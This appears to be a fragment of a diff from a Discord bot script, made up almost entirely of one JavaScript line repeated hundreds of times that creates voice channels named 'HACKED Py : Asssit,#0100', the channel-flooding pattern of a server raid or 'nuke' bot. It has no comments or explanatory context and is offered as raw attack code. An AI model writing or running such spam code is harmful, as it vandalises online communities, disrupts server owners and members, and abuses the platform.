+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
